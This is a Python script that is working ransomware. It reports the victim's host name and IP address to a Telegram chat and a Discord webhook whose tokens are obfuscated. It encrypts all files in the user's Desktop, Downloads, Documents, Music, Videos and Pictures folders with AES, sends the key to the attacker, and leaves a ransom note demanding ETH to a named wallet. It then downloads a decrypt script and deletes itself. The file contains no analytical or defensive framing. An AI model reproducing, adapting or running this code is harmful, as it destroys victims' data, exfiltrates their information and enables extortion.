import telepot
import string
import os
import random
import socket
import copy
from discord_webhook import DiscordWebhook
import hashlib
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import shutil
import math
import requests
from pathlib import Path
import sys

def delete_script():
    script_path = os.path.abspath(sys.argv[0])
    try:
        os.remove(script_path)
        #print(f"Script '{script_path}' deleted successfully.")
    except Exception as e:
        #print(f"Error deleting script: {e}")
        pass

hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

Tel_room = "-4154559786"
number_of_encrypts = 0

hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

def download_file(url, filename):
    try:
        # Send an HTTP GET request to the URL
        response = requests.get(url)
        response.raise_for_status()  # Raise an exception for 4XX and 5XX status codes
        
        # Get the user's desktop directory
        desktop_path = Path.home() / "Desktop"
        
        # Construct the full file path
        file_path = desktop_path / filename
        
        # Save the content of the response to the file
        with open(file_path, 'wb') as f:
            f.write(response.content)
        
        #print(f"File downloaded successfully to {file_path}")
    except requests.exceptions.RequestException as e:
        #print("Error downloading the file:", e)
        pass

def get_folder_size(folder_path):
    # Function to calculate the total size of a folder and its subfolders
    def convert_size(size_bytes):
        # Function to convert bytes to a human-readable format
        if size_bytes == 0:
            return "0B"
        size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
        i = int(math.floor(math.log(size_bytes, 1024)))
        p = math.pow(1024, i)
        s = round(size_bytes / p, 2)
        return "%s %s" % (s, size_name[i])

    total_size_bytes = 0
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            total_size_bytes += os.path.getsize(file_path)
    return convert_size(total_size_bytes)

def decrypt(Key, content):
  Normal_Characters = list(string.ascii_letters + string.punctuation + string.digits)
  CypherCharacters = copy.deepcopy(Normal_Characters)
  random.seed(Key)
  random.shuffle(CypherCharacters)
  CipherText = content
  Text = ""
  for letter in CipherText:
     index = CypherCharacters.index(letter)
     Text += Normal_Characters[index]
  return Text

D_Token = decrypt(Key=r"R10tCrypt0", content=r"e>>9A8nn@SAqCa@QqCmn_9SngHueCCwAn&?&KDDD7KK#^7^DJ#O6n.xhf0:b#>->3)Kx*eVYJNEKYb>J-ii+wh%mYP}@_~e}AOGf%m}0*3>eAV+*3SJ7N{?P#")
Tel_Token = decrypt(Key=r"R10T_TTOK1", content=r">CC04}yC'0Foo|iJ)1^)a~Qo;&Xc;#[!{ocoMQZL2AI);}")

bot = telepot.Bot(Tel_Token)

def send_message(content):
    bot.sendMessage(Tel_room, content)
    webhook = DiscordWebhook(url=D_Token, content=content)
    webhook.execute()
    #print (f"Message sent.")

send_message(f"Computer {hostname} has ran the script. IP = {IPAddr}")

def encrypt_folder(folder_path, key):
    # Check if key length is 24 characters
    if len(key) != 24:
        raise ValueError("Key length must be 24 characters")

    # Traverse through the directory tree
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            try:
                encrypt_file(file_path, key)
            except Exception as e:
                #print(f"Failed to encrypt {file_path}: {e}")
                pass

def encrypt_file(file_path, key):
    global number_of_encrypts
    # Check if key length is 24 characters
    if len(key) != 24:
        raise ValueError("Key length must be 24 characters")

    # Derive a 256-bit key from the provided key using PBKDF2
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    derived_key = kdf.derive(key.encode())

    # Generate a random initialization vector (IV)
    iv = os.urandom(16)

    # Create cipher object using AES in CBC mode with PKCS7 padding
    cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Open the input file and read its content
    with open(file_path, 'rb') as f:
        plaintext = f.read()

    # Perform padding to ensure the plaintext length is a multiple of 16 bytes
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_plaintext = padder.update(plaintext) + padder.finalize()

    # Encrypt the padded plaintext
    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()

    # Determine the encrypted file name with ".encrypted" extension
    encrypted_file_name = os.path.basename(file_path) + ".encrypted"

    # Write salt, IV, and ciphertext to the encrypted file
    encrypted_file_path = os.path.join(os.path.dirname(file_path), encrypted_file_name)
    with open(encrypted_file_path, 'wb') as f:
        f.write(salt)
        f.write(iv)
        f.write(ciphertext)

    # Replace the original file with the encrypted file
    shutil.move(encrypted_file_path, file_path)
    number_of_encrypts = number_of_encrypts+1
    #print("Encryption successful. Original file encrypted:", file_path)







def create_text_file_on_desktop(file_name, content=''):
    try:
        # Get the path to the desktop directory
        desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')

        # Create the file path
        file_path = os.path.join(desktop_path, file_name)

        # Write content to the file
        with open(file_path, 'w') as file:
            file.write(content)

        #print(f"Text file '{file_name}' created successfully on the desktop.")

    except Exception as e:
        pass
        #print(f"An error occurred: {e}")



def grab_info():
   send_message(f"computer {hostname} is online, reporting with ip address {IPAddr}")

def get_encryption_size(directories):
    total_size_bytes = 0
    
    # Iterate through each directory
    for name, path in directories.items():
        # Walk through the directory and sum up the sizes of all files
        for dirpath, _, filenames in os.walk(path):
            for filename in filenames:
                filepath = os.path.join(dirpath, filename)
                total_size_bytes += os.path.getsize(filepath)
    
    # Convert total size to appropriate unit (MB, GB, TB)
    if total_size_bytes < 1024:
        return f"{total_size_bytes} bytes"
    elif total_size_bytes < 1024 * 1024:
        return f"{total_size_bytes / 1024:.2f} KB"
    elif total_size_bytes < 1024 * 1024 * 1024:
        return f"{total_size_bytes / (1024 * 1024):.2f} MB"
    elif total_size_bytes < 1024 * 1024 * 1024 * 1024:
        return f"{total_size_bytes / (1024 * 1024 * 1024):.2f} GB"
    else:
        return f"{total_size_bytes / (1024 * 1024 * 1024 * 1024):.2f} TB"

directories = {
    "Desktop": os.path.join(os.path.expanduser("~"), "Desktop"),
    "Downloads": os.path.join(os.path.expanduser("~"), "Downloads"),
    "Documents": os.path.join(os.path.expanduser("~"), "Documents"),
    "Music": os.path.join(os.path.expanduser("~"), "Music"),
    "Videos": os.path.join(os.path.expanduser("~"), "Videos"),
    "Pictures": os.path.join(os.path.expanduser("~"), "Pictures")
    }





def encrypt_files():
   encryption_key = int(''.join(str(random.randint(0, 9)) for _ in range(24)))
   #print (encryption_key)
   for folder_name, folder_path in directories.items():
        folder_size = get_folder_size(folder_path)
        encryption_size = get_encryption_size(directories=directories)
        send_message(f"Attempting to encrypt '{folder_name}' directory with a total size of '{folder_size}'")
        encrypt_folder(folder_path=folder_path, key=str(encryption_key))
   eth_amount = (f"0.0{random.randint(6,8)}ETH")
   day_amount = (f"{random.randint(2,4)}")
   crypto_wallet = r"0xA8751bcE4ca787CE8d630727F048592dD03B9A5A"
   file_name = "READ_ME.txt"
   content = f"Uh Oh, about {encryption_size} of your important files have been encrypted! Dont panic you can retrive your files by sending {eth_amount} to this wallet - '{crypto_wallet}' after send an email to 'encouraging_sloth_8202@posteo.com', you have {day_amount} days to send the ETH or your files will be gone forever"
   send_message(f"files on computer {hostname}, have been encrypted with a total size of {encryption_size} with the key .'  {encryption_key}  '., the user must pay {eth_amount} within {day_amount} days.")
   create_text_file_on_desktop(file_name, content)
   url = r"https://raw.githubusercontent.com/Lixvinity/winjv/main/decrypt.py"
   download_file(url, filename="DECRYPT.py")
encrypt_files()
delete_script()



